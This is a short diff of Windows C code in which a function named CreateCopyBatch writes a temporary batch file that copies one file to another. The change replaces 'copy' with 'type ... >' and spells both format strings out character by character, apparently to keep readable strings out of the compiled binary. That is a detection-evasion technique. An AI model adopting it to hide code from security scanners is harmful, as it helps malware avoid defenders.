@@ -573,13 +573,14 @@ VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName)
 	ULONG uTick ,uOut;
 	PWCHAR pTempPath = GetTemp();
 	PWCHAR pBatchName = (PWCHAR)malloc(32767*sizeof(WCHAR));
-	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', 'c', 'o', 'p', 'y', ' ', '"', '%', 'S', '"', ' ', '"', '%', 'S', '"', 0x0};
+	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', '%', 'S', '"', ' ', '>', '"', '%', 'S', '"', 0x0};
 	PCHAR pBatchBuffer = (PCHAR)malloc(strlen(pBatchFormat) + (32767 * 3));
 
 	uTick = GetTickCount();
 	do
 	{
-		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
+		WCHAR pName[] = { L'%', L's', L'\\', L'%', L'd', L'.', L'b', L'a', L't', L'\0' };
+		_snwprintf_s(pBatchName, 32766, _TRUNCATE, pName, pTempPath, uTick++);
 		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFile && hFile != INVALID_HANDLE_VALUE)
 			break;
